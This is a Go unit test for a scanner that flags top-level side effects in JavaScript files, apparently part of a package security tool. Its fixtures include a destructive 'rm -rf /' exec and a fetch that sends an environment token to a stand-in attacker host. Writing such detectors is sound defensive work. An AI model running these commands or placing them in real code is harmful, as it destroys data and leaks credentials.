package analyzer

import (
	"testing"
)

func TestSideEffectAnalyzer(t *testing.T) {
	tests := []struct {
		name     string
		content  string
		expected string
		severity Severity
	}{
		{
			"Top-level exec",
			"require('child_process').exec('rm -rf /');",
			"Immediate code execution detected",
			SeverityCritical,
		},
		{
			"Top-level fetch",
			"fetch('https://evil.com/steal?data=' + process.env.TOKEN);",
			"Immediate code execution detected",
			SeverityHigh,
		},
		{
			"Inside function (Safe from side-effect)",
			"function init() { fetch('https://api.com'); }",
			"",
			0,
		},
	}

	analyzer := NewSideEffectAnalyzer()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := analyzer.scanContent(tt.content, "index.js")
			
			if tt.expected == "" {
				if len(findings) > 0 {
					t.Errorf("expected 0 findings, got %d", len(findings))
				}
				return
			}

			found := false
			for _, f := range findings {
				if f.Severity == tt.severity {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected finding with severity %v, got %+v", tt.severity, findings)
			}
		})
	}
}
